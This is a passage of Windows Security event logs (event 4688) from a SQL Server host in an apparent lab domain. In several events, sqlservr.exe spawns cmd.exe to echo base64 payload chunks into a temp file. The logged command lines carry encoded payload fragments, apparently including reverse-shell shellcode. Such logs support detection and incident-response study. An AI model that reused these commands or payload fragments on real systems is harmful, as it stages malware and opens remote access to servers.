      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:19.038083700Z" />
      <EventRecordID>1331331</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x132c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo ADA9nMBAAItOFItGEIXJfBZ/BIXAdhBlAG3oXQAAUVDoBx4AAOsHnjGD+P91BAvAk7gz9CGLRgyLSNFR/2NZgAAAAHSAhcB0MaHsfUEAi97NhcB1/1Bo7ABBANMOhocAAIPEDKPsBUEAhcB0BVcp0OsINQH/FUzAQACLRkmL4aKNVfxqJFJQUf9TtMAg+oXAdAhfM32Si+VdMos1mMBAAP/WhcB10l9eM+VdiGvWBb31CgBfXrXlXcOQrZCQkJCQkJAnTZCQkFWL+W/kdQhWNxP7//8IxAQMwHUdiwZoQJNAAEpQ6P69//9nVFhr9nQGs+hRCyoAI8Be5MIEAJCQkJCQkM6QkJBVi+xTVot1EFeLfXUz24tNCI1F1FC3EIlKEOjRFQAAi00QA7Er8YXZhcBUBD79d96LUBSFyXQCOhlfXltdwisAVfrsTOw8oRUIQQBTM9LIE/gRV4lV+IlV9IkZ9H0Xi0UQEvAIUFEgEgYAAIPECB9eKIvlm9GLD6z3wWIAcwAPWywCAACL8TPbgeYAABFRiV38iDbsdArHRfzeAACIQ138i/mB5wAAIhp0s4PLAoldhoHhAABwfIlN6HQGg8sEiV38i0UUg4UCD4XhAH8Ai1UMagRo4AAJAGoy/QAVBMFAAIPEDIXAdS2LRQy7BABwWFODwG0ugAH8AFD/FQTNhUODxMPewHX3/k1LFrYAAAAXx0EMXABiTAZBAIVXdRl0aGgBQQBqAei2gwAAg/5NXEwGLACFwHQSi03ojVXs99lSjVXwG8nRACPK7ez4999RjU1Dlf8j+YtN/AHeGyRXI/KLfQxWUY0MWmoByf/Q6wpqAf9/TKdAADPACvsGIwmLVQwLlBsMQwAzyTvBD4WtAAAAi30IiwvsaCD9zABoa5xAAIsHUlDo97v//+mzNAAAg/gBdVcj+QZBADvCURxSaFABQRpqAegXDwAAg0AMo1AGQQCFwHRfi03ojVXsCdkvjVXT7D1qACPKoFX4999RCE30G/8j+YtNDPclG/ZXu/JWU2oBUf+w6ZH///8FLA+FkjcAAPZUBkEAp8J1vVIOQOlBM2oBLLgOAACDxAwZVAZBsoUQdaFqAWcVTMBIYohP3P8Xi30IiU1CiU30iU34OU3odGHFVRBS6Ogn1gAAXMTA61IWRfgzySzBdFqJR8WLRzkNAAABAC1HBItF9DvBdA6JRxSLRwQNANYC84lHD4xF8GrBzWOLtxBQrVfogT4AAIPEDOsPX164eBEBAFtP5V3Di30Ig57cCEEAMg+M7gEAAD5FELsAAgAAhUsPhAsBAACDOgwBD25pATmQi3UUhfam0V50BokAhcB1GVBoucNBaWoF6OkNAABNowyjdN1BAIVJVTtqBY1NxGogUYtNDNBV5JF3n9DHwA+LvgAAI4tF5IXAD9UgAAAAi/A3i1XEsUc0i+YEiVepC8PF0i0AAGoB/xVMwEAA69WLHUzA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:19.040305100Z" />
      <EventRecordID>1331332</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x378</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x132c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:19.311286500Z" />
      <EventRecordID>1331333</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1084</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo 4gBqAP//3/4CfW6hYAbjAIXAdTlQaNcBQQBQlwQN+pWjYAZnAOsfg/4BwjehXBZYAIV7dQVQaPgAQQBQ6FMNqQCjXAbrAKplDIVodA6LVQyNFwhRUv/Qi/DrC2oB/9Mz9qYSOnUMg/7SdQr/FZjAQKqFwJoai00IM5ALxjPSiW4wi0cEZsqAzAKJTzSJygTRRwTvdRD30CzGX/f6G8Beg3gRAQDti+WSw5CQkJCQkJCQkAyQUYuji0V2UP/9TcBAADOpXcOQkZCQkJDgkJCQkIhokJBVi+yDYehTM8CwV4stDIlF7IlF8IvHM9slAEdAAIldW4ldCYld6IlFZHRNOR2EBkEAdUVohAZBAFNTU/RTcd9TjU30agFRiF1FyV31iOL2iF33iF34xsf5Af8VCMBAAIXAxQ+9gEZAAOg/GAAAg8QE6waJHYQG9AA9dQjjxwAAEAB0b/dG/wAAAQB0ZthIBtEAi1YmO7fHReq0AAAAibrJFh1TaIwBQQBqAVwRDAAAKMQMOwej2AbbAL9lhwAAlI1NDI1V4FGKTRBSUf/QRcOQIYtVDGoIUuhEAQDVi04Ig/EIC8iL8wQxAJMQAIlOCIlGBPfHAE4gAA8xgboAAPdG9QAAAgCjeItGFMdF7AIAAACJRfChCgYDADvDdRlTI9UBQQBqsuiWMQAAg8QMO8Oj6QZBAGcajU0MjVXgUYtNUFJR/9DrFGop/xVMwEAAkoGKAdQVIAQ2AOsEO8N/IYu3DGoEUui3AEsAi68IvMQIC8iLRgQNAAAgAIlOCNJGBDld/HRn/OsNquYQz6MV6zfl88G9Iej7AgAAkOsMxX/mP19+fnFSCPH6YInlMdLrDGSgW2TH0nU6re5o1WSLUjDrDPAgnuMi4SLv8nZxt4tSDJCLUhSQ6w8DqYDqQ+21l/u+T3oRnDDrDLxhTda/6H/b0M9po4tyKJDrDWK5NisF9U6iLwJT9woPt0om6wv+48qISP2Poipl+DH/kOsLdiE03/EqaUGzUwaQMcCQ6whggJyCIf/GaqyQPGGQfA+QLCCQ6wlFKUJfx9DR2YOQwc8N6wqIhGwkKJV7M2SSAcfrDxbCE5/MhOUzEEbXvXkhgUl1tpBSkOsIR2j7O96rtQ9XkOsK6OEZYZYtNIb5AYtSEJCLQjyQ6wtvHO6CtppXUZfrwgHQkItAeIXAkA+EtgEAAOsJvBHhi5cnz6vJAdDrD12ZWMG2rWEDmeWRyuaFWlCQi0gYi1ggkOsKWj6NjF2V6/wP7wHTkOsMxs4Ny3WWoZb9DEkykOsPUGhe0FYUivF+muOt2x/jhcmQD4RGAQAAkOsOvZ+yYJE+39wN+IDWXMhJizSLAdaQ6wtQFwEqgj9bn18lTzH/kOsKShDNuj3pWEjOv5DrDij9+3UKqbBF2wGyxXDuMcCQ6w4Cplr2VcWyhpYN5gTVkayQwc8NkOsOIhqtsOiPVxK+FrdCnvQB&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:19.313532500Z" />
      <EventRecordID>1331334</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1094</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1084</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:19.583937500Z" />
      <EventRecordID>1331335</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xb44</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo x+sIyJOqipK4o6w44A+Fsv///+sJVWXfDqpkc3LGA3346wkmy805CdaC7xk7fSTrCXoq/AyR3Z+p2g+FNv///5DpDQAAAEOAGPBCPwsOEOS4SPxYi1gkAdOQZosMS+kIAAAA4ZF6dTR1EKmLWByQAdPpDgAAADzr22+JJD6d2vOvQtJpiwSLkAHQkOkMAAAApjTuBCYQRood+3hYkIlEJCSQ6QsAAAB0lVBKaS++djGx3VtbkGGQWVqQUekIAAAA2kGuwS1Wa+X/4OkIAAAAZ4kDrCJTk4mQWJDpCQAAAPjvPDpX5tzz81+Q6Q8AAACEMdRbvwr7DZMyxev56uFaixKQ6WD9///pCQAAAPUlzX6HtN4PzF2Q6Q8AAABwuGpzUMvE5pad0q5uc5G+GwEAAOkIAAAAfoWOrSYS922Q6Q8AAAD+0GR7iAeQMW7un57/X4tqQGgAEAAAVpDpDQAAAAUQfxQtECQH+leljZ1qAGhYpFPlkP/VicPpCwAAABDRzwj7WJYUuekXiceJ8ZDo9QAAAJDpCQAAAJ3VijUXjciCwl6Q8qTpCAAAANEGnMe8MHFO6KEAAADpCAAAACZD37TiNo/ckLvgHSoKaKaVvZ2QieiQ/9CQPAbpDAAAABAGNsMwWSS98MHinQ+MRgAAAJDpDwAAAPT9Rhy9AGSJMBUnVhTH34D74JDpCAAAAGzD5M415AjID4UaAAAAu0cTcm+Q6Q8AAADbVWp20uhp2BJ/MI81JZhqAFPpDAAAAC2gRnCgjOhn04XwHP/V6QgAAAATIH2zFQozkDHAZP8wkGSJIJDpCwAAAEFMN7ar3r5mm3QR/9PpCQAAAHCGRysfPIS5B+k9////6BX////86IIAAABgieUxwGSLUDCLUgyLUhSLcigPt0omMf+sPGF8Aiwgwc8NAcfi8lJXi1IQi0o8i0wReONIAdFRi1kgAdOLSRjjOkmLNIsB1jH/rMHPDQHHOOB19gN9+Dt9JHXkWItYJAHTZosMS4tYHAHTiwSLAdCJRCQkW1thWVpR/+BfX1qLEuuNXWgzMgAAaHdzMl9UaEx3JgeJ6P/QuJABAAApxFRQaCmAawD/1WoBaAoXewtoAgARXInmUFBQUEBQQFBo6g/f4P/Vl2oQVldomaV0Yf/VhcB0DP9OCHXsaPC1olb/1WoAagRWV2gC2chf/9WLNmpAaAAQAABWagBoWKRT5f/Vk1NqAFZTV2gC2chf/9UBwynGde7DgKJAAEiLAIvoDPj//13CBABADCGQkMGQkKacwgQAkJCQF4yQkCiokJBVi+yLOUmLrxSFQXQzi0257VD/FSrAQACFuXUe74uZmMBAABdqhcB1BV5dwggA/9a0gPwKAF5dwggAM8BdwggAuDtORgBdwggAkJCQkIyQkMOQ2L+QkMOQkJCQkJBFkJBViySDPUcIEABtfCNoKAdBUv8VQMBMAItFA2gxV0Bkjrpe&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:19.586235800Z" />
      <EventRecordID>1331336</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xe18</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xb44</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:19.857801000Z" />
      <EventRecordID>1331337</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x109c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo zgBohQecAFDoobH//zMMXcOQkJCQQ4+Q/JCQkLyQaCgHQez/FTzAQAAzwMOQkFWL7ItFCIvIgeEAAADAgfnLAADALgypAAD/P7gFAAAAdAW4xAAAql3DZpAXkJCQkKCL7EhFFFaIdXgZ2CjA09hIUDHMFFD/FZzAnwAj14lFFEVLi6Y1qU0RUVL/FSTAQIqFwHRKi6oMi00UhcB0AokIi1XAhdJ0C1Hogv///4PEpokCi5YUUP8V/cBAv8exFNq0AHO4dREBAKBdwhAAZgJz1wBaCrh2EQEAXiXCEHEkNZjAQF8s1oXAdQVeXcIQAP/WBYD8CgBeZcIaAJCQkAkL9uyLTRCLRQiFyVZ0HI10CP87xnMRi1UMigqEyegIdAlAXDvGcvLGAJReXcLLAJBViyNTIdyowXIAVleLgQhqL1f/02pcV4vw/9ODxBA7xnbVi/CMMHUO3zpX/9Mu8IOjCIUDdAqNRgFMXltdwgS0i8dfXvFdwgQAkKaQkNBJkFVSMoPsGCyLXRCF21f5QfwAAAAAfROLRQwz24PuALcJi0yYBM6FyXX3jQSdBAAAAFZQ/xVcwUAAncQEi/j124l99H5Ei0UMwiArxxVd+IkwEOsDC0V3iykwUf9JicFAAIPEBECJBotV/APQi0X4gsYESInJ/IlF+ETZzUX8jURAAaWJRfzKnlztQOaixAQzyYXbiUUNi/B+VPhFDBxN9CvBi03IiUX0iekMeV2N6wOLRQB41fJN7I1N/IlV8Ik3iwQHUY1V8J9SqehZBQAAi038i0V1K8GDxwQD8ItFDEiJRQyz5ot99FVNrItF+McEjwUAjSbG/QAr8AN3UP8VIMFAQHpN+IPE/TsAD/AxK8GL10k0att+NosUhwNrshSHq2jD/fOLTQgSbIk5X1uL5V3Di1XyHsOJOl9biytdw4tFCIk4oMOiW8blucNkkJCQYFWL7KHc3UUAVpzAVw+F6QEA/2j4B0EAxwX4B0GelAAAAP8VIMBAAKH0CEEAg/gCD4W0AQAAoAwIQQC+kXxYADAbdDuLPUDBQAChdMFAAIM4RX4OM8mK4IoOUf/Xw44I6xGheMFA4zPSihaLCIoEUYPgEdvAdTaKRgHrhMB1y4sNtwgEAKH8tEEAg/ihD4JfAQAuD4RZARIAgwoEdWWD+VZzI7goAAA/6UoBAACAPgB0zVb/FajBQMqLyIPE7YkN4AgFAOu/d9u4rwAbAOklAQAAgPkDdze4K2YAAOm7AQAAg/kEdwq4LEQAAOkHATYAuiIAAL3C0RvAwGODwC3p9AAAlYP4BXVVoZzIQQCFwHUeqcl1/rgyAOAAA9gAAAAzwAf5Wg+VwINDM+nIE6QAg/gCegpNBwDdAOlyAAAAg/kBxAp6PFkAAOmqAAAAM8CD+YyhlRiDwD3pmgBfAIOXXPfYG8Ak9oM0UEqJQwAAg/gBdX+jjtb/AL52CFsAhMB0O4s9aMFA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:19.860043400Z" />
      <EventRecordID>1331338</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x644</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x109c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:20.131122700Z" />
      <EventRecordID>1331339</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x870</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo omN0wUAAzTgBfrkzyWoBig5R/wGDxAjrEaF4wUAAM9LNFhMIKgRRg+D9hcDCCIpG7EbEwITLoQAIQQCh+ApzEIoOM8CA+UMPncCNRAA34iGD+FoMEIoOM7WA+UEPncCNRDAO6wy4c3oAAOsFuAEAAACj3AhB34tVCJ2JAtU13AhBnzPAg/4BD53ASIclLk4AAF3DkJCWkJCQkJBVi+yLRQhWiwyF5AhBAA40heQIQQCFMW8XiwQcVMRAAFD/FRjAQACFwOsGdQNeqsOLkB6FwHQNiw5QUf8VHARAAF5dw4suDIsGUlBwFRzAQABeXcOQkM2QkJAMTpA7kJBVpuyD7OVTSdKLVqWLF/XSiVX4dQ5f6jPAmIuEXcIQAN5V+ItNFIM5cmDqi9pSM8CKBpGEwIl1CDMZBombixFGiRGLPBBmiTeDwQL6TRC0yAEAAIvIgeHABwAAgPmnD5yHoAAAmb/gJQAAvsiJVfAjz4Pbvp8AAAAz0jvPiXQEiVPsdTQ7PGkwi8dk07kBAAAA6NoNAAAL+AvaRoP+JQ91/NdIi0XsiwjwJccjyzvHdQQ7y3SFi0Xsi1Xwi8vP0YvrI0yLVfz31iPwjUIBiUX0UVH4hnEPhp0BOgC++gHzEnWzg0MeM//nx69nX164FgAAAFuLfgXCEAALgHUet0DHD6SVjIoC//+JKYz/AAAA9MQrI9OHzHTTiwblU/oCdRGD/g1WLW3JdSmYZAj2ACDrH4P6A3Uchcl/kXwFg/4E66qD/i11DIXJdQiLRcH2ADAfmal9FLgCAABvO8KLHxvA99hAO9gPgqr+//+F0nQ/iz8I6wOLVfyEJUo0B4lV6rgCgeLApwAAR4D6gIl9CA8hV///dg+k8QaD4D+ZweYG6WYLriTwi5z8hcCLyuXGEEWSR1X0K8JWMwyzyU8Cfxd8CIH+AAABAHMNvUUUixBKiRCLRRDrPItFFIsCFMP+gcYAAP//g9GSiRiL0YvGuQoAcszoeQwAAGaLyItFEBLN2IHm/wPLymaJCIPAAuPOANwAP2aJwbfAAh5FEIt9DLsHhcCJRfgPhfX9//9fl1uL5V3CEBNfXrh4AgEAW4vlXcJwAJCQkMKQkJDtkJAQrpD+VZzsg+wIi1XQU1ZXizqF/4m6/HUOxV4zwFvJ5V3CEL7EffyLRRSDmwAeNpd1CDPJZosOg8YCgfn/AAAAiXUIfRZPRc9lME6JA/ZFWIgIQIlFEOlJ5gAAi8Elz/wAAD0AgAAALIQeAQAAPQDYAAB1RoP/Ag+C/gAAAGaLBovQgUwA/AAAgfoAMQAAD4X1AADEgeH/AwAAJRIDAADB4QoLwYPGCJmLc4v6gcMAlwEAiXUIg7AA6weLwZnG2Iv6i8OL17kLAAAA6FULFQAIyL4BAAATC8p0EbkFAAAA6EALAACLyEYLynXvi1UUOzIPg8D//7y4AgAAO4tVDDvG3/b8G8n32W3Bg03/&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:20.133372900Z" />
      <EventRecordID>1331340</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x53c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x870</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
